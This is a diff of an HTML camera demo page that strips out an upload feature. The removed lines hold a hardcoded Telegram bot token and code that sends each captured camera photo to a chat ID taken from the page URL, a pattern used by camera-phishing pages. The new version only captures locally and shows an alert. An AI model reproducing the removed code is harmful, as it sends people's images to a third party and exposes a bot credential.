@@ -1,52 +1,32 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <meta charset="UTF-8">
-    <title>Camera Safe Demo</title>
+    <title>Camera Page</title>
 </head>
 <body>
 
-<h2>📸 Camera Demo (User Permission Required)</h2>
+<h2>📸 Camera Demo</h2>
 
 <video id="video" autoplay playsinline></video>
-<br><br>
-<button onclick="takePhoto()">Capture Photo</button>
+<br>
+<button onclick="capture()">Capture</button>
 
 <canvas id="canvas" style="display:none;"></canvas>
 
 <script>
-const botToken = "8674737787:AAEjg7PQ66Bd_01WoPajyWAKV-KWuiaBN2Y";
-
-const urlParams = new URLSearchParams(window.location.search);
-const chatId = urlParams.get('id');
-
 const video = document.getElementById("video");
 const canvas = document.getElementById("canvas");
 const ctx = canvas.getContext("2d");
 
-// Camera open (permission required)
+// camera permission
 navigator.mediaDevices.getUserMedia({ video: true })
 .then(stream => {
     video.srcObject = stream;
-})
-.catch(err => {
-    alert("Camera permission denied!");
 });
 
-// User click required
-function takePhoto() {
+function capture() {
     ctx.drawImage(video, 0, 0, 640, 480);
-
-    canvas.toBlob(blob => {
-        const formData = new FormData();
-        formData.append("chat_id", chatId);
-        formData.append("photo", blob);
-
-        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-            method: "POST",
-            body: formData
-        });
-    }, "image/jpeg");
+    alert("Photo captured (demo only)");
 }
 </script>
 
